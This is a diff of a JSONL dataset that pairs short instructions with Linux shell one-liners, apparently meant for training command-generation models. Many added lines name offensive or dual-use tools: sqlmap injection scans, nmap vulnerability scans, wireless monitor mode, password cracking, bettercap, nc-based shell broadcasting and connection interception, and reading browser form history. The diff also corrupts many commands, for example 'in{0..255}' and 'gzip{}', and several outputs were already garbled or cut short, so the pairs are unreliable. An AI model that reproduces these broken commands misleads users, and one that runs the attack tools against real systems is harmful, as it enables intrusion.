-    "output": "sqlmap -u 'http://example.com/?id=1'"
-  },
-  {
-    "instruction": "Perform DNS enumeration",
-    "output": "dnsrecon -d example.com"
-  },
-  {
-    "instruction": "Test SSL/TLS configuration",
-    "output": "sslyze --regular example.com"
-  },
-  {"instruction": "Run the last command as root", "output": "sudo !!"}
+{"instruction": "Merge multiple JSON files", "output": "jq -s '.' file1.json file2.json > merged.json"}
+{"instruction": "Show all active network interfaces", "output": "ip link show up"}
+{"instruction": "Monitor network packets on specific port", "output": "tcpdump -i any port 80"}
+{"instruction": "Show network interface statistics", "output": "ip -s link"}
+{"instruction": "Display routing table in detail", "output": "ip route show table all"}
+{"instruction": "Show network interface queue statistics", "output": "tc -s qdisc show"}
+{"instruction": "Find files modified in git repository today", "output": "git log --since=midnight --name-only --oneline"}
+{"instruction": "Show git branch creation date", "output": "git show --no-patch --no-notes --pretty='%ai' branch_name"}
+{"instruction": "Find largest files in git history", "output": "git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | awk '$1 == \"blob\"{print $3, $4}' | sort -nr | head -10"}
+{"instruction": "Remove file from git history", "output": "git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch path/to/file' --prune-empty --tag-name-filter cat -- --all"}
+{"instruction": "Show commits by author", "output": "git log --author=\"username\" --pretty=format:\"%h - %an, %ar : %s\""}
+{"instruction": "Create SSH key with specific algorithm", "output": "ssh-keygen -t ed25519 -C \"your_email@example.com\""}
+{"instruction": "Show SSH client configuration", "output": "cat ~/.ssh/config"}
+{"instruction": "Test SSH connection without logging in", "output": "ssh -T user@hostname"}
+{"instruction": "Forward local port through SSH tunnel", "output": "ssh -L 8080:localhost:80 user@remote_host"}
+{"instruction": "Create persistent SSH connection", "output": "ssh -o ServerAliveInterval=60 user@host"}
+{"instruction": "Extract audio from video file", "output": "ffmpeg -i video.mp4 -vn -acodec copy audio.aac"}
+{"instruction": "Convert video codec without re-encoding audio", "output": "ffmpeg -i input.mp4 -c:v libx264 -c:a copy output.mp4"}
+{"instruction": "Create video thumbnail", "output": "ffmpeg -i video.mp4 -ss 00:00:01.000 -vframes 1 thumb.jpg"}
+{"instruction": "Add subtitles to video", "output": "ffmpeg -i video.mp4 -i subtitles.srt -c copy -c:s mov_text output.mp4"}
+{"instruction": "Compress video maintaining quality", "output": "ffmpeg -i input.mp4 -vcodec libx264 -crf 23 output.mp4"}
+{"instruction": "List all available package versions", "output": "apt-cache madison package_name"}
+{"instruction": "Show package dependencies", "output": "apt-cache depends package_name"}
+{"instruction": "Find which package provides a file", "output": "dpkg -S /path/to/file"}
+{"instruction": "Show package installation status", "output": "dpkg -l | grep package_name"}
+{"instruction": "Clean package cache", "output": "apt-get clean && apt-get autoclean"}
+{"instruction": "Start Wireshark capture as non-root", "output": "wireshark -k -i any"}
+{"instruction": "Run network vulnerability scan", "output": "nmap -sV --script vuln target_host"}
+{"instruction": "Create wordlist from website", "output": "cewl -d 2 -m 5 -w wordlist.txt http://example.com"}
+{"instruction": "Monitor wireless networks", "output": "airodump-ng wlan0mon"}
+{"instruction": "Hash cracking with John the Ripper", "output": "john --wordlist=wordlist.txt hashes.txt"}
+{"instruction": "Show all Bluetooth devices", "output": "bluetoothctl devices"}
+{"instruction": "Show CPU architecture details", "output": "lscpu | grep 'Architecture\\|Model name\\|CPU(s)'"}
+{"instruction": "Display system BIOS information", "output": "sudo dmidecode -t bios"}
+{"instruction": "Show GPU driver version", "output": "nvidia-smi --query-gpu=driver_version --format=csv,noheader"}
+{"instruction": "Display USB device tree", "output": "lsusb -t"}
+{"instruction": "Show system power management capabilities", "output": "cat /sys/power/state"}
+{"instruction": "Hibernate the system", "output": "systemctl hibernate"}
+{"instruction": "Set system to reboot at specific time", "output": "echo 'shutdown -r' | at 23:00"}
+{"instruction": "Cancel scheduled shutdown", "output": "shutdown -c"}
+{"instruction": "Put system in maintenance mode", "output": "systemctl isolate rescue.target"}
+{"instruction": "Create a new group with specific GID", "output": "groupadd -g 1500 newgroup"}
+{"instruction": "Lock user account", "output": "passwd -l username"}
+{"instruction": "Show all users with sudo privileges", "output": "getent group sudo | cut -d: -f4"}
+{"instruction": "Set user account expiry date", "output": "usermod -e 2024-12-31 username"}
+{"instruction": "Force user to change password at next login", "output": "chage -d 0 username"}
+{"instruction": "Find files with broken ACL", "output": "getfacl -R / 2>/dev/null | grep -B1 'Permission denied'"}
+{"instruction": "Show files accessed in last hour recursively", "output": "find . -type f -amin -60 -ls"}
+{"instruction": "Create file with specific timestamp", "output": "touch -t 202401011200 filename"}
+{"instruction": "Find files with specific extension and compress them", "output": "find . -name '*.log' -exec gzip{} \\;"}
+{"instruction": "Batch rename files with regex", "output": "rename 's/\\.jpeg$/.jpg/' *.jpeg"}
+{"instruction": "Copy text from terminal to clipboard", "output": "echo 'text' | xclip -selection clipboard"}
+{"instruction": "Read clipboard content", "output": "xclip -selection clipboard -o"}
+{"instruction": "Monitor keyboard input events", "output": "sudo showkey -a"}
+{"instruction": "Clear clipboard contents", "output": "echo -n '' | xclip -selection clipboard"}
+{"instruction": "Record terminal session", "output": "script terminal_session.log"}
+{"instruction": "Convert JSON to YAML", "output": "python3 -c 'import sys, yaml, json; print(yaml.dump(json.load(sys.stdin)))'"}
+{"instruction": "Extract specific JSON field recursively", "output": "jq '.. | .field? | select(. != null)'"}
+{"instruction": "Validate JSON file", "output": "jq 'empty' file.json"}
+{"instruction": "Show motherboard model", "output": "dmidecode -t 2 | grep -i product"}
+{"instruction": "Display RAM timing information", "output": "sudo dmidecode -t memory | grep -i speed"}
+{"instruction": "Show TPM status", "output": "tpm2_getcap -l"}
+{"instruction": "Display battery health status", "output": "upower -i /org/freedesktop/UPower/devices/battery_BAT0"}
+{"instruction": "Show CPU frequency scaling governor", "output": "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"}
+{"instruction": "Display all PCI Express devices", "output": "lspci -vv | grep -A 10 'Express'"}
+{"instruction": "Show disk read-ahead value", "output": "blockdev --getra /dev/sda"}
+{"instruction": "Display NUMA node information", "output": "numactl --hardware"}
+{"instruction": "Show system interrupt statistics", "output": "cat /proc/interrupts"}
+{"instruction": "Display active kernel parameters", "output": "sysctl -a"}
+{"instruction": "Set CPU performance mode", "output": "echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor"}
+{"instruction": "Enable power saving for USB devices", "output": "echo auto | sudo tee /sys/bus/usb/devices/*/power/control"}
+{"instruction": "Schedule system wake from suspend", "output": "echo 0 | sudo tee /sys/class/rtc/rtc0/wakealarm && echo $(date '+%s' -d '+ 8 hours') | sudo tee /sys/class/rtc/rtc0/wakealarm"}
+{"instruction": "Set disk I/O scheduler", "output": "echo deadline | sudo tee /sys/block/sda/queue/scheduler"}
+{"instruction": "Enable SysRq key", "output": "echo 1 | sudo tee /proc/sys/kernel/sysrq"}
+{"instruction": "Create user with specific login shell", "output": "useradd -s /bin/zsh -m username"}
+{"instruction": "Set user process priority limits", "output": "echo 'username hard nice -5' | sudo tee -a /etc/security/limits.conf"}
+{"instruction": "Add user to multiple groups", "output": "usermod -aG group1,group2,group3 username"}
+{"instruction": "Show user resource limits", "output": "ulimit -a"}
+{"instruction": "Set maximum number of user processes", "output": "ulimit -u 5000"}
+{"instruction": "Find files with specific extended attributes", "output": "find / -xattr -exec getfattr -d{} \\;"}
+{"instruction": "Create sparse file of specific size", "output": "truncate -s 1G sparsefile"}
+{"instruction": "Find files with duplicate content ignoring name", "output": "find . -type f -exec md5sum{} \\; | sort | uniq -w32 -dD"}
+{"instruction": "Set file timestamp to match another file", "output": "touch -r reference_file target_file"}
+{"instruction": "Find files with specific capability set", "output": "getcap -r / 2>/dev/null"}
+{"instruction": "Paste clipboard content to specific line in file", "output": "xclip -selection clipboard -o | sed -i '5r /dev/stdin' file.txt"}
+{"instruction": "Copy file content to primary selection", "output": "xclip -selection primary file.txt"}
+{"instruction": "Monitor X11 events", "output": "xev"}
+{"instruction": "Record mouse clicks and keyboard input", "output": "xnee --record --mouse --keyboard --out-file events.xnee"}
+{"instruction": "Show clipboard managers", "output": "ps aux | grep -i clip"}
+{"instruction": "Convert JSON to XML", "output": "python3 -c 'import json,sys,xmltodict; print(xmltodict.unparse({\"root\":json.load(sys.stdin)}))"}
+{"instruction": "Find null values in JSON", "output": "jq 'paths as $p | select(getpath($p) == null) | $p | join(\".\")"}
+{"instruction": "Compare two JSON files", "output": "diff <(jq -S . file1.json) <(jq -S . file2.json)"}
+{"instruction": "Extract nested JSON array", "output": "jq '.field[].subfield[]'"}
+{"instruction": "Convert JSON to line-delimited format", "output": "jq -c '.[]' file.json"}
+{"instruction": "Show network interface ring buffer size", "output": "ethtool -g eth0"}
+{"instruction": "Display network interface offload settings", "output": "ethtool -k eth0"}
+{"instruction": "Show network interface driver information", "output": "ethtool -i eth0"}
+{"instruction": "Display network interface wake-on-lan status", "output": "ethtool eth0 | grep Wake-on"}
+{"instruction": "Show network interface pause frame settings", "output": "ethtool -a eth0"}
+{"instruction": "Find commits touching specific function", "output": "git log -L :function_name:file.c"}
+{"instruction": "Show commit history for specific lines", "output": "git log -L10,20:file.txt"}
+{"instruction": "Find first commit that introduced a string", "output": "git log -S 'string' --source --all"}
+{"instruction": "Show commits that moved a file", "output": "git log --follow --name-status -- file.txt"}
+{"instruction": "Find commits between two tags", "output": "git log tag1..tag2 --oneline"}
+{"instruction": "Generate SSH key with custom comment", "output": "ssh-keygen -t rsa -b 4096 -C 'custom comment'"}
+{"instruction": "Create SSH key with specific output file", "output": "ssh-keygen -t ed25519 -f ~/.ssh/custom_key"}
+{"instruction": "Show SSH key fingerprint", "output": "ssh-keygen -lf ~/.ssh/id_rsa.pub"}
+{"instruction": "Change SSH key passphrase", "output": "ssh-keygen -p -f ~/.ssh/id_rsa"}
+{"instruction": "Convert SSH key format", "output": "ssh-keygen -e -f ~/.ssh/id_rsa > openssh_key"}
+{"instruction": "Adjust video playback speed", "output": "ffmpeg -i input.mp4 -filter:v \"setpts=0.5*PTS\" output.mp4"}
+{"instruction": "Extract specific video segment", "output": "ffmpeg -i input.mp4 -ss 00:01:00 -t 00:02:00 -c copy output.mp4"}
+{"instruction": "Convert video to animated GIF", "output": "ffmpeg -i input.mp4 -vf \"fps=10,scale=320:-1\" output.gif"}
+{"instruction": "Add watermark to video",   "output": "ffmpeg -i input.mp4 -i watermark.png -filter_complex 'overlay=10:10' output.mp4"
+}
+{"instruction": "Combine multiple videos", "output": "ffmpeg -f concat -i list.txt -c copy output.mp4"}
+{"instruction": "List available package architectures","output": "dpkg --print-architecture && dpkg --print-foreign-architectures"}
+{"instruction": "Show package installation size","output": "apt-cache show package_name | grep 'Size'"}
+{"instruction": "Find reverse package dependencies","output": "apt-cache rdepends package_name"}
+{"instruction": "Show package version policy","output": "apt-cache policy package_name"}
+{"instruction": "List manually installed packages","output": "apt-mark showmanual"}
+{"instruction": "Set up wireless network monitor mode","output": "airmon-ng start wlan0"}
+{"instruction": "Analyze HTTP traffic with bettercap","output": "sudo bettercap -iface eth0"}
+{"instruction": "Scan for SQL injection vulnerabilities","output": "sqlmap -u 'http://example.com/?id=1'"}
+{"instruction": "Perform DNS enumeration","output": "dnsrecon -d example.com"}
+{"instruction": "Test SSL/TLS configuration","output": "sslyze --regular example.com"}
+{"instruction": "Run the last command as root", "output": "sudo !!"}
 {"instruction": "Serve current directory tree at http://$HOSTNAME:8000/", "output": "python -m SimpleHTTPServer"}
 {"instruction": "Runs previous command but replacing", "output": "^foo^bar"}
 {"instruction": "Rapidly invoke an editor to write a long, complex, or tricky command", "output": "ctrl-x e"}
@@ -1202,7 +831,7 @@
 {"instruction": "Graphical tree of sub-directories", "output": "ls -R |  grep \":$\" |  sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/   /' -e 's/-/|/'"}
 {"instruction": "intercept stdout/stderr of another process", "output": "strace -ff -e trace=write -e write=1,2 -p SOME_PID"}
 {"instruction": "Copy a file using pv and watch its progress", "output": "pv sourcefile > destfile"}
-{"instruction": "Define a quick calculator function", "output": "? () {  echo \"$*\" |  bc -l; }"}
+{"instruction": "Define a quick calculator function", "output": "? (){  echo \"$*\" |  bc -l; }"}
 {"instruction": "Create a CD/DVD ISO image from disk.", "output": "readom dev=/dev/scd0 f=/path/to/image.iso"}
 {"instruction": "mkdir & cd into it as single command", "output": "mkdir /home/foo/doc/bar &&  cd $_"}
 {"instruction": "Create a pdf version of a manpage", "output": "man -t  manpage |  ps2pdf - filename.pdf"}
@@ -1216,13 +845,13 @@
 {"instruction": "Job Control", "output": "^Z $bg $disown"}
 {"instruction": "Generate a random password 30 characters long", "output": "s trings /dev/urandom |  grep -o '[[:alnum:]]' |  head -n 30 |  tr -d '"}
 {"instruction": "Show apps that use internet connection at the moment. (Multi-Language)", "output": "ss -p"}
-{"instruction": "Graph # of connections for each hosts.", "output": "netstat -an |  grep ESTABLISHED |  awk '{ print $5}' |  awk -F: '{ print $1}' |  sort |  uniq -c |  awk '{  printf(\"%s\\t%s\\t\",$2,$1) ;  for (i = 0; i < $1; i++) { printf(\"*\")};  print \"\" }'"}
+{"instruction": "Graph # of connections for each hosts.", "output": "netstat -an |  grep ESTABLISHED |  awk '{ print $5}' |  awk -F: '{ print $1}' |  sort |  uniq -c |  awk '{  printf(\"%s\\t%s\\t\",$2,$1) ;  for (i = 0; i < $1; i++){ printf(\"*\")};  print \"\" }'"}
 {"instruction": "Record a screencast and convert it to an mpeg", "output": "ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 /tmp/outputFile.mpg"}
 {"instruction": "Monitor progress of a command", "output": "pv access.log |  gzip > access.log.gz"}
 {"instruction": "Search for a <pattern> string inside all files in the current directory", "output": "grep -RnisI <pattern> *"}
 {"instruction": "Monitor the queries being run by MySQL", "output": "watch -n 1 mysqladmin --user=<user> --password=<password> processlist"}
 {"instruction": "Get the 10 biggest files/folders for the current direcotry", "output": "du -s * |  sort -n |  tail"}
-{"instruction": "Show numerical values for each of the 256 colors in bash", "output": "for  code in {0..255}; do  echo -e \"\\e[38;05;${ code}m $ code: Test\"; done"}
+{"instruction": "Show numerical values for each of the 256 colors in bash", "output": "for  code in{0..255}; do  echo -e \"\\e[38;05;${ code}m $ code: Test\"; done"}
 {"instruction": "Recursively remove all empty directories", "output": "find . -type d -empty -delete"}
 {"instruction": "Display a cool clock on your terminal", "output": "watch -t -n1 \"date +%T|figlet\""}
 {"instruction": "Convert seconds to human-readable format", "output": "date -d@1234567890"}
@@ -1246,7 +875,7 @@
 {"instruction": "Attach screen over ssh", "output": "ssh -t remote_host  screen -r"}
 {"instruction": "Show a 4-way scrollable process tree with full details.", "output": "ps awwfux |  less -S"}
 {"instruction": "List all bash shortcuts", "output": "bind -P"}
-{"instruction": "RTFM function", "output": "rtfm() { help $@ ||  man $@ || $BROWSER \"http://www.google.com/search?q=$@\"; }"}
+{"instruction": "RTFM function", "output": "rtfm(){ help $@ ||  man $@ || $BROWSER \"http://www.google.com/search?q=$@\"; }"}
 {"instruction": "Eavesdrop on your system", "output": "diff <( lsof -p 1234) <(sleep 10;  lsof -p 1234)"}
 {"instruction": "Remove all files previously extracted from a tar(.gz) file.", "output": "tar -tf <file. tar.gz> |  xargs  rm -r"}
 {"instruction": "Broadcast your shell thru ports 5000, 5001, 5002 ...", "output": "script -qf |  tee >(nc -kl 5000) >(nc -kl 5001) >(nc -kl 5002)"}
@@ -1267,7 +896,7 @@
 {"instruction": "Binary Clock", "output": "watch -n 1 'echo \"obase=2;`date +%s`\" | bc'"}
 {"instruction": "Sort the size usage of a directory tree by gigabytes, kilobytes, megabytes, then bytes.", "output": "du -b --max-depth 1 |  sort -nr |  perl -pe 's{([0-9]+)}{sprintf \"%.1f%s\", $1>=2**30? ($1/2**30, \"G\"): $1>=2**20? ($1/2**20, \"M\"): $1>=2**10? ($1/2**10, \"K\"): ($1, \"\")}e'"}
 {"instruction": "Duplicate installed packages from one machine to the other (RPM-based systems)", "output": "ssh root@remote.host \"rpm -qa\" |  xargs  yum -y  install"}
-{"instruction": "Draw kernel module dependancy graph.", "output": "lsmod |  perl -e ' print \"digraph \\\" lsmod\\\" {\";<>;while(<>){@_=split/\\s+/;  print \"\\\"$_[0]\\\" -> \\\"$_\\\""}
+{"instruction": "Draw kernel module dependancy graph.", "output": "lsmod |  perl -e ' print \"digraph \\\" lsmod\\\"{\";<>;while(<>){@_=split/\\s+/;  print \"\\\"$_[0]\\\" -> \\\"$_\\\""}
 {"instruction": "Compare two directory trees.", "output": "diff <(cd dir1 &&  find | sort) <(cd dir2 &&  find | sort)"}
 {"instruction": "Bring the word under the cursor on the :ex line in Vim", "output": ":<C-R><C-W>"}
 {"instruction": "Remind yourself to leave in 15 minutes", "output": "leave +15"}
@@ -1279,18 +908,18 @@
 {"instruction": "Backup all MySQL Databases to individual files", "output": "for I in $(mysql -e 'show databases' -s --skip-column-names); do  mysqldump $I |  gzip > \"$I.sql.gz\"; done"}
 {"instruction": "Port Knocking!", "output": "knock <host> 3000 4000 5000 &&  ssh -p <port> user@host && knock <host> 5000 4000 3000"}
 {"instruction": "Add timestamp to history", "output": "export HISTTIMEFORMAT=\"%F %T \""}
-{"instruction": "Recursively change permissions on files, leave directories alone.", "output": "find ./ -type f -exec  chmod 644 {} \\;"}
+{"instruction": "Recursively change permissions on files, leave directories alone.", "output": "find ./ -type f -exec  chmod 644{} \\;"}
 {"instruction": "Find files that have been modified on your system in the past 60 minutes", "output": "sudo  find / -mmin 60 -type f"}
 {"instruction": "Quick access to ASCII code of a key", "output": "showkey -a"}
 {"instruction": "using `!#$' to referance backward-word", "output": "cp /work/host/phone/ui/main. cpp !#$:s/host/target"}
-{"instruction": "Search recursively to find a word or phrase in certain file types, such as C code", "output": "find . -name \"*.[ch]\" -exec  grep -i -H \"search pharse\" {} \\;"}
+{"instruction": "Search recursively to find a word or phrase in certain file types, such as C code", "output": "find . -name \"*.[ch]\" -exec  grep -i -H \"search pharse\"{} \\;"}
 {"instruction": "Intercept, monitor and manipulate a TCP connection.", "output": "mkfifo /tmp/fifo;  cat /tmp/fifo |  nc -l -p 1234 |  tee -a to.log |  nc machine port |  tee -a from.log > /tmp/fifo"}
 {"instruction": "Block known dirty hosts from reaching your machine", "output": "wget -qO - http://infiltrated.net/blacklisted|awk '!/#|[a-z]/&&/./{print \"iptables -A INPUT -s \"$1\" -j DROP\"}'"}
 {"instruction": "check site ssl certificate dates", "output": "echo |  openssl s_client -connect www.google.com:443 2>/dev/null | openssl x509 -dates -noout"}
 {"instruction": "find files in a date range", "output": "find . -type f -newermt \"2010-01-01\" ! -newermt \"2010-06-01\""}
 {"instruction": "Control ssh connection", "output": "[enter]~?"}
 {"instruction": "run complex remote shell cmds over ssh, without escaping quotes", "output": "ssh  host -l user $(<cmd.txt)"}
-{"instruction": "Create a directory and change into it at the same time", "output": "md () {  mkdir -p \"$@\" &&  cd \"$@\"; }"}
+{"instruction": "Create a directory and change into it at the same time", "output": "md (){  mkdir -p \"$@\" &&  cd \"$@\"; }"}
 {"instruction": "Colorized grep in less", "output": "grep --color=always |  less -R"}
 {"instruction": "Exclude multiple columns using AWK", "output": "awk '{$1=$3=\"\"}1'  file"}
 {"instruction": "ls not pattern", "output": "ls !(*.gz)"}
@@ -1367,7 +996,7 @@
 {"instruction": "Recover a deleted file", "output": "grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt"}
 {"instruction": "Insert the last argument of the previous command", "output": "<ESC> ."}
 {"instruction": "View the newest xkcd comic.", "output": "xkcd(){  wget -qO- http://xkcd.com/|tee >(feh $(grep -Po '(?<=\")http://imgs[^/]+/comics/[^\"]+\\.\\w{3}'))|grep -Po '(?<=(\\w{3})\" title=\").*(?=\" alt)';}"}
-{"instruction": "Create an audio test CD of sine waves from 1 to 99 Hz", "output": "( echo CD_DA;  for f in {01..99}; do  echo \"$f Hz\">&2;  sox -nt cdda -r44100 -c2 $f.cdda synth 30 sine $f;  echo TRACK AUDIO;  echo FILE \\\"$f.cdda\\\" 0; done) > cdrdao.toc && cdrdao  write cdrdao.toc &&  rm ??.cdda cdrdao.toc"}
+{"instruction": "Create an audio test CD of sine waves from 1 to 99 Hz", "output": "( echo CD_DA;  for f in{01..99}; do  echo \"$f Hz\">&2;  sox -nt cdda -r44100 -c2 $f.cdda synth 30 sine $f;  echo TRACK AUDIO;  echo FILE \\\"$f.cdda\\\" 0; done) > cdrdao.toc && cdrdao  write cdrdao.toc &&  rm ??.cdda cdrdao.toc"}
 {"instruction": "Remove color codes (special characters) with sed", "output": "sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\""}
 {"instruction": "throttle bandwidth with cstream", "output": "tar -cj /backup | cstream -t 777k |  ssh  host ' tar -xj -C /backup'"}
 {"instruction": "When feeling down, this command helps", "output": "sl"}
@@ -1382,13 +1011,13 @@
 {"instruction": "List files with quotes around each filename", "output": "ls -Q"}
 {"instruction": "Makes you look busy", "output": "alias busy='my_file=$(find /usr/include -type f |  sort -R |  head -n 1); my_len=$(wc -l $my_file |  awk \"{print $1}\"); let \"r = $RANDOM % $my_len\" 2>/dev/null;  vim +$r $my_file'"}
 {"instruction": "Duplicate several drives concurrently", "output": "dd if=/dev/sda |  tee >( dd of=/dev/sdb) |  dd of=/dev/sdc"}
-{"instruction": "Listen to BBC Radio from the command line.", "output": "bbcradio() {  local  s PS3=\"Select a  station: \"; select  s in 1 1x 2 3 4 5 6 7 \"A sian Network an\" \"Nation s & Local lcl\";do break;done; s=($ s);mplayer -playli st \"http://www.bbc.co.uk/radio/li sten/live/r\"${ s[@]: -1}\".a sx\";}"}
+{"instruction": "Listen to BBC Radio from the command line.", "output": "bbcradio(){  local  s PS3=\"Select a  station: \"; select  s in 1 1x 2 3 4 5 6 7 \"A sian Network an\" \"Nation s & Local lcl\";do break;done; s=($ s);mplayer -playli st \"http://www.bbc.co.uk/radio/li sten/live/r\"${ s[@]: -1}\".a sx\";}"}
 {"instruction": "Monitor bandwidth by pid", "output": "nethogs -p eth0"}
 {"instruction": "Execute a command with a timeout", "output": "timeout 10  sleep 11"}
 {"instruction": "use vim to get colorful diff output", "output": "svn  diff |  view -"}
 {"instruction": "find files containing text", "output": "grep -lir \"some text\" *"}
 {"instruction": "Quickly graph a list of numbers", "output": "gnuplot -persist <(echo \"plot '<(sort -n listOfNumbers.txt)' with lines\")"}
-{"instruction": "Perform a branching conditional", "output": "true && {  echo success;} || {  echo failed; }"}
+{"instruction": "Perform a branching conditional", "output": "true &&{  echo success;} ||{  echo failed; }"}
 {"instruction": "Resume scp of a big file", "output": "rsync --partial --progress --rsh=ssh  $file_source $user@$host:$destination_file"}
 {"instruction": "Use tee + process substitution to split STDOUT to multiple commands", "output": "some_command |  tee >(command1) >(command2) >(command3) ... | command4"}
 {"instruction": "Analyse an Apache access log for the most common IP addresses", "output": "tail -10000 access_log |  awk '{print $1}' |  sort |  uniq -c |  sort -n |  tail"}
@@ -1415,9 +1044,9 @@
 {"instruction": "Single use vnc-over-ssh connection", "output": "ssh -f -L 5900:localhost:5900 your. ssh.server \"x11vnc -safer -localhost -nopw -once -display :0\"; vinagre localhost:5900"}
 {"instruction": "List alive hosts in specific subnet", "output": "nmap -sP 192.168.1.0/24"}
 {"instruction": "View all date formats, Quick Reference Help Alias", "output": "alias  dateh=' date --help|sed -n \"/^ *%%/,/^ *%Z/p\"|while  read l;do F=${l/% */};  date +%$F:\"|'\"'\"'${F//%n/ }'\"'\"'|${l#* }\";done|sed \"s/\\ *|\\ */|/g\" |column -s \"|\" -t'"}
-{"instruction": "your terminal sings", "output": "echo {1..199}\" bottles of beer on the wall, cold bottle of beer, take one down,  pass it around, one  less bottle of beer on the wall,, \" |  espeak -v english -s 140"}
+{"instruction": "your terminal sings", "output": "echo{1..199}\" bottles of beer on the wall, cold bottle of beer, take one down,  pass it around, one  less bottle of beer on the wall,, \" |  espeak -v english -s 140"}
 {"instruction": "Make sure a script is run in a terminal.", "output": "[ -t 0 ] ||  exit 1"}
-{"instruction": "Matrix Style", "output": "echo -e \"\\e[32m\";  while :; do  for i in {1..16}; do r=\"$(($RANDOM % 2))\";  if [[ $(($RANDOM % 5)) == 1 ]]; then  if [[ $(($RANDOM % 4)) == 1 ]]; then v+=\"\\e[1m $r   \"; else v+=\"\\e[2m $r   \"; fi; else v+=\"     \"; fi; done;  echo -e \"$v\"; v=\"\"; done"}
+{"instruction": "Matrix Style", "output": "echo -e \"\\e[32m\";  while :; do  for i in{1..16}; do r=\"$(($RANDOM % 2))\";  if [[ $(($RANDOM % 5)) == 1 ]]; then  if [[ $(($RANDOM % 4)) == 1 ]]; then v+=\"\\e[1m $r   \"; else v+=\"\\e[2m $r   \"; fi; else v+=\"     \"; fi; done;  echo -e \"$v\"; v=\"\"; done"}
 {"instruction": "Quickly (soft-)reboot skipping hardware checks", "output": "/sbin/kexec -l /boot/$KERNEL --append=\"$KERNELPARAMTERS\" --initrd=/boot/$INITRD; sync; /sbin/kexec -e"}
 {"instruction": "pipe output of a command to your clipboard", "output": "some command|xsel --clipboard"}
 {"instruction": "Recursively compare two directories and output their differences on a readable format", "output": "diff -urp /originaldirectory /modifieddirectory"}
@@ -1460,7 +1089,7 @@
 {"instruction": "perl one-liner to get the current week number", "output": "date +%V"}
 {"instruction": "DELETE all those duplicate files but one based on md5 hash comparision in the current directory tree", "output": "find . -type f -print0|xargs -0 md5sum|sort|perl -ne 'chomp;$ph=$h;($h,$f)=split(/\\s+/,$_,2);print \"$f\".\"\\x00\"  if ($h eq $ph)'|xargs -0  rm -v --"}
 {"instruction": "List recorded formular fields of Firefox", "output": "cd ~/.mozilla/firefox/ &&  sqlite3 `cat profiles.ini |  grep Path |  awk -F= '{print $2}'`/formhistory.sqlite \"select *  from moz_formhistory\" &&  cd - > /dev/null"}
-{"instruction": "Using awk to sum/count a column of numbers.", "output": "cat count.txt |  awk '{ sum+=$1} END {print sum}'"}
+{"instruction": "Using awk to sum/count a column of numbers.", "output": "cat count.txt |  awk '{ sum+=$1} END{print sum}'"}
 {"instruction": "Get all the keyboard shortcuts in screen", "output": "^A ?"}
 {"instruction": "Get list of servers with a specific port open", "output": "nmap -sT -p 80 -oG - 192.168.1.* |  grep open"}
 {"instruction": "Start a new command in a new screen window", "output": "alia s  s=' screen -X  screen';  s top;  s vi;  s  man l s;"}
@@ -1471,22 +1100,22 @@
 {"instruction": "send a circular", "output": "echo \"dear admin, please ban eribsskog\" |  wall"}
 {"instruction": "List all open ports and their owning executables", "output": "lsof -i -P |  grep -i \"listen\""}
 {"instruction": "Purge configuration files of removed packages on debian based systems", "output": "aptitude purge '~c'"}
-{"instruction": "Monitor open connections for httpd including listen, count and sort it per IP", "output": "watch \"netstat -plan|grep :80|awk {'print \\$5'} |  cut -d: -f 1 |  sort |  uniq -c |  sort -nk 1\""}
+{"instruction": "Monitor open connections for httpd including listen, count and sort it per IP", "output": "watch \"netstat -plan|grep :80|awk{'print \\$5'} |  cut -d: -f 1 |  sort |  uniq -c |  sort -nk 1\""}
 {"instruction": "Convert text to picture", "output": "echo -e \"Some Text Line1"}
 {"instruction": "Remote screenshot", "output": "DISPLAY=\":0.0\"  import -window root screenshot.png"}
 {"instruction": "Define words and phrases with google.", "output": "define(){  local y=\"$@\";curl -sA\"Opera\" \"http://www.google.com/search?q=define:${y// /+}\"|grep -Po '(?<=<li>)[^<]+'|nl|perl -MHTML::Entities -pe 'decode_entities($_)' 2>/dev/null;}"}
 {"instruction": "List all authors of a particular git project", "output": "git log --format='%aN' |  sort -u"}
-{"instruction": "track flights from the command line", "output": "flight_status() {  if [[ $# -eq 3 ]];then offset=$3; else offset=0; fi;  curl \"http://mobile.flightview.com/TrackByRoute.aspx?view=detail&al=\"$1\"&fn=\"$2\"&dpdat=$(date +%Y%m%d -d ${offset}day)\" 2>/dev/null |html2text |grep \":\"; }"}
+{"instruction": "track flights from the command line", "output": "flight_status(){  if [[ $# -eq 3 ]];then offset=$3; else offset=0; fi;  curl \"http://mobile.flightview.com/TrackByRoute.aspx?view=detail&al=\"$1\"&fn=\"$2\"&dpdat=$(date +%Y%m%d -d ${offset}day)\" 2>/dev/null |html2text |grep \":\"; }"}
 {"instruction": "Harder, Faster, Stronger SSH clients", "output": "ssh -4 -C -c blowfish-cbc"}
 {"instruction": "Clean up poorly named TV shows.", "output": "rename -v 's/.*[s,S](\\d{2}).*[e,E](\\d{2}).*\\.avi/SHOWNAME\\ S$1E$2.avi/' poorly.named.file.s01e01.avi"}
 {"instruction": "Pretty Print a simple csv in the command line", "output": "column -s, -t <tmp.csv"}
-{"instruction": "Cleanup firefox's database.", "output": "find ~/.mozilla/firefox/ -type f -name \"*.sqlite\" -exec  sqlite3 {} VACUUM \\;"}
+{"instruction": "Cleanup firefox's database.", "output": "find ~/.mozilla/firefox/ -type f -name \"*.sqlite\" -exec  sqlite3{} VACUUM \\;"}
 {"instruction": "Mount the first NTFS partition inside a VDI file (VirtualBox Disk Image)", "output": "mount -t  ntfs-3g -o ro,loop,uid=user,gid=group,umask=0007,fmask=0117,offset=0x$(hd -n 1000000  image.vdi |  grep \"eb 52 90 4e 54 46 53\" |  cut -c 1-8) image.vdi /mnt/vdi-ntfs"}
 {"instruction": "check open ports", "output": "lsof -Pni4 |  grep LISTEN"}
 {"instruction": "Find Duplicate Files (based on MD5 hash)", "output": "find -type f -exec  md5sum '{}' ';' |  sort |  uniq --all-repeated=separate -w 33 |  cut -c 35-"}
 {"instruction": "Triple monitoring in screen", "output": "tmpfile=$(mktemp) &&  echo -e 'startup_message off"}
